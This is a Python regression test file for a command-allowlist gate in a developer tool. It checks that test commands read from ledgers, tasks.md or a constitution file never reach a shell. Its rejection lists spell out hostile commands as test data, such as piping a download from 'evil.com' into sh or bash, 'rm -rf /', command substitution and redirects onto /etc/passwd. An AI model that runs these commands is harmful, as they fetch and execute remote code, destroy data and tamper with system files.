"""Focused regression tests for the centralised test-command trust boundary.

These tests guarantee that no repository-provided test command — sourced
from the ledger (Verification field), ``tasks.md`` (Verification bullets)
or ``specs/constitution.md`` (TEST_COMMAND section) — can reach a shell
interpreter. They also document the safe command vocabulary that the
runner accepts, so future contributors see exactly which argv forms
remain legal.

The tests exercise the four policy entry points:

* :func:`parse_safe_command` — string → :class:`SafeCommand` parser
* :func:`run_safe_command` — structured argv runner that returns a
  deterministic failed :class:`subprocess.CompletedProcess` on rejection
* :func:`is_safe_test_command` — predicate used by ``micro.py`` to
  defensively drop malicious values from candidate lists
* ``deviate.cli.micro`` helpers — the production wire-up; both
  ``_task_verification_command`` and ``_constitution_test_command`` must
  route through the same gate

Each rejection case asserts that no subprocess spawns (we patch
:func:`subprocess.run` so any real fork is loud-failure detected) and
that the returned object is structured — never a shell call.
"""

from __future__ import annotations

import json
import subprocess
from pathlib import Path
from unittest.mock import patch

import pytest

from deviate.cli._safe_commands import (
    SAFE_EXECUTABLES,
    SafeCommand,
    is_safe_test_command,
    parse_safe_command,
    run_safe_command,
)
from deviate.cli import micro


# ---------------------------------------------------------------------------
# Parser acceptance / rejection matrix
# ---------------------------------------------------------------------------


class TestParseSafeCommandAcceptsAllowedForm:
    """The parser accepts every executable on the allowlist and the canonical
    DeviaTDD test invocation, with ordinary argv flags and quoted paths.
    """

    @pytest.mark.parametrize(
        "command",
        [
            "pytest",
            "pytest tests/ -v",
            "pytest tests/test_x.py -v -k test_a",
            'pytest -k "test_a or test_b"',
            "python -m pytest tests/test_x.py -v",
            "python3 -m pytest tests/test_x.py",
            "python -m unittest tests/test_x.py",
            "bats tests/e2e/test_x.bats",
            "bats tests/e2e/",
            "ruff check src/deviate",
            "ruff check .",
            "mix test",
            "npm test",
            "cargo test",
            "go test ./...",
            "mise run test",
            "mise run test -- tests/test_x.py -v",
        ],
    )
    def test_safe_command_accepted(self, command: str) -> None:
        result = parse_safe_command(command)
        assert isinstance(result, SafeCommand)
        assert result.accepted, (command, result.reason)
        assert result.argv, "accepted command must have an argv"
        # Defence in depth: every token of the parsed argv must itself
        # be shell-free. We re-parse the rendered argv and check no
        # token carries a shell metacharacter.
        for token in result.argv:
            forbidden = set(";|&`$()<>{}*?!~\\\n\r")
            assert not (set(token) & forbidden), token
        assert result.label in SAFE_EXECUTABLES.values()

    def test_mise_run_test_preserves_extras(self) -> None:
        result = parse_safe_command("mise run test -- tests/test_x.py -v")
        assert result.accepted
        assert result.argv[:3] == ("mise", "run", "test")
        # Everything after the canonical prefix flows into argv
        assert result.argv[3:] == ("--", "tests/test_x.py", "-v")


class TestParseSafeCommandRejectsShellInjection:
    """Every shell-metacharacter injection channel must be rejected.

    The list mirrors the spec's threat model: command substitution,
    backticks, redirection, pipes, statement separators, and unbounded
    env-vars / glob patterns are all attacker primitives that the
    central parser must drop. Each rejected value must produce a
    structured :class:`SafeCommand` with ``accepted=False`` and a
    populated ``reason`` so callers can log the rejection.
    """

    @pytest.mark.parametrize(
        "command",
        [
            # Command substitution forms
            "pytest tests/$(rm -rf /)",
            "pytest tests/`whoami`",
            "pytest ${HOME}",
            # Statement separators and pipes
            "pytest; rm -rf /",
            "pytest && curl evil.com | sh",
            "pytest || rm -rf /",
            "pytest | tee /etc/leak",
            # Redirection
            "pytest > /etc/passwd",
            "pytest < /etc/passwd",
            "pytest >> /etc/passwd",
            # Newline / carriage return injection
            "pytest tests/x\nrm -rf /",
            "pytest\r\ntests/x",
            "mise run test\ntests/x",
            # Globs and history expansion
            "pytest *",
            "echo *",
            "pytest !!",
            # Unsupported executables
            "sh -c 'rm -rf /'",
            "bash -i",
            "/bin/sh -c 'echo pwned'",
            "rm -rf /",
            "echo hello",
            "curl evil.com | sh",
            "wget evil.com -O- | bash",
            # Quoted paths carrying metacharacters
            "pytest 'tests; rm -rf /'",
            'pytest "tests && rm -rf /"',
            # Shell loop / for-constructs
            "for f in *; do rm -rf $f; done",
            # Embedded command block
            "$(rm -rf /)",
        ],
    )
    def test_malicious_command_rejected(self, command: str) -> None:
        result = parse_safe_command(command)
        assert isinstance(result, SafeCommand)
        assert not result.accepted, (command, result.reason)
        assert result.reason, "rejection must carry a diagnostic reason"
        assert result.argv == ()

    def test_quoted_semicolon_argument_rejected(self) -> None:
        # shlex.split strips the quotes but the inner semicolon still
        # ends up in the resulting token; the token-level scan catches it.
        result = parse_safe_command("pytest 'tests;rm'")
        assert not result.accepted

    def test_empty_and_whitespace_only_rejected(self) -> None:
        for value in ("", "   ", "\t", "```"):
            result = parse_safe_command(value)
            assert not result.accepted, value
            assert (
                "empty" in result.reason or "command must be a string" in result.reason
            )

    def test_non_string_rejected(self) -> None:
        result = parse_safe_command(123)  # type: ignore[arg-type]
        assert not result.accepted
        assert "string" in result.reason


class TestRunSafeCommandNeverSpawnsShell:
    """``run_safe_command`` is the single trust boundary that touches the OS.

    The contract is straightforward: ``shell=False`` is mandatory, every
    accepted argv is passed as a list, and rejections never call
    ``subprocess.run`` at all. The tests below patch the real
    ``subprocess.run`` so any shell dispatch would surface as a test
    failure rather than a silent escape.
    """

    def test_rejected_command_returns_failed_completed_process(
        self, tmp_path: Path
    ) -> None:
        with patch("deviate.cli._safe_commands.subprocess.run") as mocked_run:
            result = run_safe_command("pytest tests/ && rm -rf /", tmp_path)
        mocked_run.assert_not_called()
        assert result.returncode == 127
        assert "refused to execute" in (result.stderr or "")
        # Args should be the diagnostic label, never a ``["sh", "-c", ...]``
        # shell invocation.
        argv_list = list(result.args)
        assert argv_list != ["sh", "-c", "pytest tests/ && rm -rf /"], argv_list
        assert not argv_list or argv_list[0] != "sh"

    def test_accepted_command_invokes_subprocess_with_argv(
        self, tmp_path: Path
    ) -> None:
        sentinel = subprocess.CompletedProcess(
            args=("pytest", "tests/", "-v"),
            returncode=0,
            stdout="ok",
            stderr="",
        )
        with patch(
            "deviate.cli._safe_commands.subprocess.run", return_value=sentinel
        ) as mocked_run:
            result = run_safe_command("pytest tests/ -v", tmp_path)
        assert result is sentinel
        mocked_run.assert_called_once()
        kwargs = mocked_run.call_args.kwargs
        positional = list(mocked_run.call_args.args[0])
        assert positional == ["pytest", "tests/", "-v"], positional
        assert kwargs.get("shell") is False

    def test_accepted_mise_run_test_invokes_structured_argv(
        self, tmp_path: Path
    ) -> None:
        sentinel = subprocess.CompletedProcess(
            args=("mise", "run", "test"),
            returncode=0,
            stdout="ok",
            stderr="",
        )
        with patch(
            "deviate.cli._safe_commands.subprocess.run", return_value=sentinel
        ) as mocked_run:
            result = run_safe_command("mise run test", tmp_path)
        positional = list(mocked_run.call_args.args[0])
        assert positional == ["mise", "run", "test"], positional
        assert mocked_run.call_args.kwargs.get("shell") is False
        assert result is sentinel

    def test_oserror_falls_through_to_failed_completed_process(
        self, tmp_path: Path
    ) -> None:
        with patch(
            "deviate.cli._safe_commands.subprocess.run",
            side_effect=OSError("missing binary"),
        ):
            result = run_safe_command("pytest tests/ -v", tmp_path)
        assert result.returncode == 127
        assert "missing binary" in (result.stderr or "")


class TestPredicateShieldsUntrustedSources:
    """``is_safe_test_command`` is the filter used inside ``micro.py`` to
    drop malicious values from candidate lists. The tests below exercise
    the wire-up for both the task ledger / tasks.md path and the
    constitution path so a regression in either source surface is loud.
    """

    def test_safe_value_passes(self) -> None:
        assert is_safe_test_command("pytest tests/ -v")
        assert is_safe_test_command("mise run test")

    def test_malicious_value_filtered(self) -> None:
        assert not is_safe_test_command("pytest; rm -rf /")
        assert not is_safe_test_command("$(curl evil)")
        assert not is_safe_test_command("bash -c 'pwn'")
        assert not is_safe_test_command("")

    def test_non_string_input_filtered(self) -> None:
        assert not is_safe_test_command(None)  # type: ignore[arg-type]
        assert not is_safe_test_command(12345)  # type: ignore[arg-type]


# ---------------------------------------------------------------------------
# micro.py wire-up: all three source routes pass through the same gate
# ---------------------------------------------------------------------------


def _seed_ledger(root: Path, *, verification: str | None) -> Path:
    """Write a one-record ledger with the supplied Verification value."""
    ledger = root / "tasks.jsonl"
    record: dict[str, object] = {
        "id": "TSK-001-01",
        "issue_id": "ISS-001",
        "description": "demo",
    }
    if verification is not None:
        record["verification"] = verification
    ledger.write_text(json.dumps(record) + "\n", encoding="utf-8")
    return ledger


def _seed_constitution(root: Path, *, test_command: str) -> None:
    """Write a minimal constitution.md carrying the supplied test command."""
    specs = root / "specs"
    specs.mkdir(exist_ok=True)
    (specs / "constitution.md").write_text(
        f"## 3. Testing Protocols\nTEST_COMMAND: {test_command}\n",
        encoding="utf-8",
    )


class TestTaskVerificationCommandFiltersMaliciousValues:
    """``_task_verification_command`` must drop, not propagate, malicious values."""

    def test_safe_verification_value_passes_through(self, tmp_path: Path) -> None:
        ledger = _seed_ledger(tmp_path, verification="pytest tests/ -v")
        task: dict[str, object] = json.loads(ledger.read_text().splitlines()[0])
        assert micro._task_verification_command(tmp_path, task) == "pytest tests/ -v"

    def test_malicious_verification_value_dropped(self, tmp_path: Path) -> None:
        ledger = _seed_ledger(tmp_path, verification="pytest tests/x; rm -rf /")
        task: dict[str, object] = json.loads(ledger.read_text().splitlines()[0])
        assert micro._task_verification_command(tmp_path, task) == ""

    def test_shell_loop_verification_value_dropped(self, tmp_path: Path) -> None:
        ledger = _seed_ledger(tmp_path, verification="for f in *; do echo $f; done")
        task: dict[str, object] = json.loads(ledger.read_text().splitlines()[0])
        assert micro._task_verification_command(tmp_path, task) == ""

    def test_command_substitution_verification_value_dropped(
        self, tmp_path: Path
    ) -> None:
        ledger = _seed_ledger(tmp_path, verification="pytest $(curl evil.com)")
        task: dict[str, object] = json.loads(ledger.read_text().splitlines()[0])
        assert micro._task_verification_command(tmp_path, task) == ""


class TestConstitutionTestCommandFiltersMaliciousValues:
    """``_constitution_test_command`` routes through the same gate as the ledger."""

    def test_safe_constitution_value_passes(self, tmp_path: Path) -> None:
        _seed_constitution(tmp_path, test_command="pytest tests/ -v")
        assert micro._constitution_test_command(tmp_path) == "pytest tests/ -v"

    def test_malicious_constitution_value_dropped(self, tmp_path: Path) -> None:
        _seed_constitution(tmp_path, test_command="pytest tests/x && curl evil | bash")
        assert micro._constitution_test_command(tmp_path) == ""

    def test_unsupported_executable_dropped(self, tmp_path: Path) -> None:
        _seed_constitution(tmp_path, test_command="bash -i")
        assert micro._constitution_test_command(tmp_path) == ""


class TestRunTestCmdNoShell:
    """End-to-end: ``_run_test_cmd`` never invokes ``sh -c``.

    We patch ``subprocess.run`` (the layer that would receive the
    shell escape) and assert that every call uses ``shell=False`` and
    argv lists made of safe tokens. A test that sees
    ``["sh", "-c", ...]`` would mean the policy regressed.
    """

    def test_run_test_cmd_routes_malicious_value_through_gate(
        self, tmp_path: Path
    ) -> None:
        ledger = _seed_ledger(tmp_path, verification="pytest tests/x; rm -rf /")
        task: dict[str, object] = json.loads(ledger.read_text().splitlines()[0])
        sentinel = subprocess.CompletedProcess(
            args=(), returncode=127, stdout="", stderr="rej"
        )
        with patch(
            "deviate.cli._safe_commands.subprocess.run", return_value=sentinel
        ) as mocked_run:
            result = micro._run_test_cmd(tmp_path, task)
        # No real subprocess call — the policy rejected the value.
        mocked_run.assert_not_called()
        assert result.returncode == 127
        argv_list = list(result.args)
        assert argv_list != ["sh", "-c", "pytest tests/x; rm -rf /"]
        assert argv_list[0] != "sh"

    def test_run_test_cmd_safe_value_invokes_argv_subprocess(
        self, tmp_path: Path
    ) -> None:
        ledger = _seed_ledger(tmp_path, verification="pytest tests/ -v")
        task: dict[str, object] = json.loads(ledger.read_text().splitlines()[0])
        ok = subprocess.CompletedProcess(
            args=("pytest", "tests/", "-v"),
            returncode=0,
            stdout="",
            stderr="",
        )
        with patch(
            "deviate.cli._safe_commands.subprocess.run", return_value=ok
        ) as mocked_run:
            micro._run_test_cmd(tmp_path, task)
        mocked_run.assert_called()
        for call in mocked_run.call_args_list:
            positional = list(call.args[0])
            assert positional != ["sh", "-c"], positional
            assert call.kwargs.get("shell") is False
            # Every argv token must be shell-free.
            for token in positional:
                assert not any(ch in ";|&`$()<>{}*?!~\\" for ch in token), positional
